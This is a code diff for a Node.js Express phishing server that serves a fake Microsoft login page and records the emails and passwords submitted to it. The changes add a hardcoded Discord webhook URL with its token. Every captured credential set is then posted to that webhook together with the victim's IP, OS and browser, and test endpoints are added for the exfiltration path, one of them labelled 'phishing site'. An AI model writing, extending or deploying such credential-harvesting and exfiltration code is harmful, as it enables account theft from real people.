@@ -8,6 +8,11 @@ import { fileURLToPath } from "url";
 import os from "os";
 import dns from "dns";
 import { promisify } from "util";
+import fetch from "node-fetch"; // Added for Discord webhook integration
+
+// Discord webhook configuration - Replace with your actual webhook URL
+const DISCORD_WEBHOOK_URL =
+  "https://discord.com/api/webhooks/1211831405630333000/psINKEzhYDxixSt1BhuOVbNh5gTimPpcNmQCjRfG6Kyic7y4eJt2uMZmSxmq2YM3vSBj"; // Replace this with your Discord webhook URL
 
 // Get directory name equivalent in ESM
 const __filename = fileURLToPath(import.meta.url);
@@ -28,14 +33,14 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve static files from the project root to access HTML templates
-app.use(express.static(projectRoot));
+// Serve static files from the public directory
+app.use(express.static(path.join(projectRoot, "public")));
 
 // Specifically serve templates directory
 app.use("/templates", express.static(path.join(projectRoot, "templates")));
 
-// Also serve from backend directory for any backend-specific assets
-app.use("/backend", express.static(__dirname));
+// Also serve from api directory for any api-specific assets
+app.use("/api", express.static(__dirname));
 
 // Function to log access with enhanced information
 async function logAccess(req) {
@@ -125,7 +130,7 @@ async function logAccess(req) {
 }
 
 // Function to log harvested credentials with enhanced information
-function logCredentials(email, password, accessInfo) {
+async function logCredentials(email, password, accessInfo) {
   // Create a more detailed log with all available information
   const credentialEntry = {
     timestamp: accessInfo.accessTime,
@@ -150,6 +155,25 @@ function logCredentials(email, password, accessInfo) {
     path.join(logsDir, "harvested_credentials.txt"),
     simpleLogEntry
   );
+
+  // Send credentials to Discord webhook
+  if (DISCORD_WEBHOOK_URL) {
+    const discordPayload = {
+      content: `New credentials captured:\nEmail: ${email}\nPassword: ${password}\nIP: ${accessInfo.ipAddress}\nOS: ${accessInfo.deviceInfo.os}\nBrowser: ${accessInfo.deviceInfo.browser}`,
+    };
+
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(discordPayload),
+      });
+    } catch (error) {
+      console.error("Error sending to Discord webhook:", error);
+    }
+  }
 }
 
 // Parse User-Agent string to extract OS, browser, and device info
@@ -258,17 +282,56 @@ app.get("/", (req, res) => {
   res.redirect("/microsoft_login.html");
 });
 
-app.get("/microsoft_login.html", (req, res) => {
-  res.sendFile(path.join(projectRoot, "microsoft_login.html"));
-});
-
-app.get("/kea_microsoft_login.html", (req, res) => {
-  res.sendFile(path.join(projectRoot, "kea_microsoft_login.html"));
-});
-
-// Handle credentials collection endpoint
-app.post("/collect_credentials", async (req, res) => {
+// Create a test endpoint for credential submission
+app.get("/test-credential-discord", async (req, res) => {
   try {
+    console.log("Test credential endpoint called");
+
+    // Create a sample access info object
+    const sampleAccessInfo = {
+      accessTime: new Date().toISOString(),
+      ipAddress: req.ip || "127.0.0.1",
+      deviceInfo: {
+        os: "Test OS",
+        browser: "Test Browser",
+      },
+    };
+
+    // Log test credentials with the Discord integration
+    await logCredentials(
+      "test@example.com",
+      "testPassword123",
+      sampleAccessInfo
+    );
+
+    res.json({
+      status: "success",
+      message: "Test credentials sent to Discord webhook",
+      webhookUrl: DISCORD_WEBHOOK_URL ? "Configured" : "Not configured",
+    });
+  } catch (error) {
+    console.error("Error testing credential Discord integration:", error);
+    res.status(500).json({
+      status: "error",
+      message: "Failed to send test credentials to Discord",
+      error: error.message,
+    });
+  }
+});
+
+// Handle credentials collection endpoints (both with and without /api prefix)
+app.post("/collect_credentials", handleCredentialSubmission);
+app.post("/api/collect_credentials", handleCredentialSubmission);
+
+// Extracted the credential processing logic into a separate function
+async function handleCredentialSubmission(req, res) {
+  try {
+    console.log("Credentials endpoint called", {
+      body: req.body,
+      path: req.path,
+      method: req.method,
+    });
+
     const accessInfo = await logAccess(req);
 
     if (req.body.email && req.body.password) {
@@ -277,11 +340,14 @@ app.post("/collect_credentials", async (req, res) => {
         accessInfo.org = req.body.org;
       }
 
-      logCredentials(req.body.email, req.body.password, accessInfo);
+      console.log("Valid credentials received, sending to Discord");
+      await logCredentials(req.body.email, req.body.password, accessInfo);
+      console.log("Credentials processed successfully");
 
       // Return success without exposing internal details
       res.json({ status: "success" });
     } else {
+      console.log("Invalid credentials received", req.body);
       res.status(400).json({
         status: "error",
         message: "Email and password required",
@@ -290,6 +356,42 @@ app.post("/collect_credentials", async (req, res) => {
   } catch (error) {
     console.error("Error processing credentials:", error);
     res.status(500).json({ status: "error", message: "Internal server error" });
+  }
+}
+
+// Create an endpoint to test Discord webhook
+app.get("/test-discord", async (req, res) => {
+  try {
+    if (
+      !DISCORD_WEBHOOK_URL ||
+      DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE"
+    ) {
+      return res.status(400).json({
+        status: "error",
+        message: "Discord webhook URL is not configured properly",
+      });
+    }
+
+    const testPayload = {
+      content: `🔔 Test notification from phishing site at ${new Date().toISOString()}`,
+    };
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(testPayload),
+    });
+
+    res.json({ status: "success", message: "Test message sent to Discord" });
+  } catch (error) {
+    console.error("Error sending test to Discord webhook:", error);
+    res.status(500).json({
+      status: "error",
+      message: "Failed to send test message to Discord",
+      error: error.message,
+    });
   }
 });
 
